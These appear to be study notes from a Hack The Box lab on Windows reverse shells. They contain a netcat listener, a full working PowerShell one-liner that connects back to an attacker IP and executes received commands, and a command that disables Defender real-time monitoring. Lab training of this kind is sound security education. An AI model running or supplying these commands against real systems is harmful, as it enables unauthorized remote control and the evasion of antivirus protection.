The attack box will have a listener running, and the target will initiate the connection.

Methods of connecting from the target host are:

- Unrestricted File Upload
- Command Injection

This is all to force the target host to initiate a connection with our target box.

Below is a list of reverse shells that we can utilize based on what attack surface we are presented with:

[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#windows-staged-reverse-tcp](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#windows-staged-reverse-tcp)

**Hands-on with a Simple Reverse Shell in Windows:**

1. On our attack box we are going to start our listener:
    
    1. We are establishing a connection over a common port (443). The reason for that is because it is common for this port to not be blocked. However, if a firewall has deep packet inspection then it may notice the reverse shell.
    
    ```bash
    realCustampin@htb[/htb]$ sudo nc -lvnp 443
    Listening on 0.0.0.0 443
    ```
    
2. On the Windows target, letâ€™s copy and paste the following powershell commands: 1.
    
    `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
    
3. We may get a Windows Antivirus error, we can get past this for right now by just turning it off: 1.
    
    ```bash
    At line:1 char:1
    + $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    This script contains malicious content and has been blocked by your antivirus software.
        + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
        + FullyQualifiedErrorId : ScriptContainedMaliciousContent
    ```
    
    `PS C:\\Users\\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true`